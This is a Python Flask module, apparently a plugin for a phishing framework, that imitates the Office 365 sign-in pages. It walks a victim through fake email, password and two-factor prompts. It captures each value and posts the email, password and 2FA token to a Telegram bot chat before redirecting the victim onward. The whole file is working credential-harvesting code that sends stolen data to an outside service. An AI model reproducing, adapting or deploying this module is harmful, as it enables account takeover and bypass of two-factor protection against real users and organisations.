from __future__ import print_function
from flask import redirect, request
from os import getenv
from core.base_module import BaseModule
import requests

class Office365Module(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)
        self.set_name('office365')
        self.add_route('login', '/')
        self.add_route('password_page', '/password')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def login(self):
        template = self.env.get_template('login.html')
        return template.render(next_url='/password', hostname=request.host)

    def password_page(self):
        self.user = request.values.get('loginfmt') or request.values.get('email')
        template = self.env.get_template('password.html')
        return template.render(next_url='/twofactor', hostname=request.host, email=self.user)

    def twofactor(self):
        self.captured_password = request.values.get('passwd')
        self.user = request.values.get('email')
        template = self.env.get_template('twofactor.html')
        return template.render(next_url='/redirect', hostname=request.host, email=self.user, password=self.captured_password)

    def redirect(self):
        self.user = request.values.get('email')
        self.captured_password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')
        self.send_telegram()
        return redirect(self.final_url, code=302)

    def send_telegram(self):
        bot_token = getenv('TELEGRAM_BOT_TOKEN')
        chat_id = getenv('TELEGRAM_CHAT_ID')
        if not bot_token or not chat_id:
            return
        message = '*New Office365 Credential*\nEmail: `{}`\nPassword: `{}`\n2FA: `{}`'.format(self.user, getattr(self, 'captured_password', ''), self.two_factor_token)
        url = 'https://api.telegram.org/bot{}/sendMessage'.format(bot_token)
        payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
        try:
            requests.post(url, json=payload, timeout=10)
        except Exception:
            pass

def load(enable_2fa=False):
    return Office365Module(enable_2fa) 
    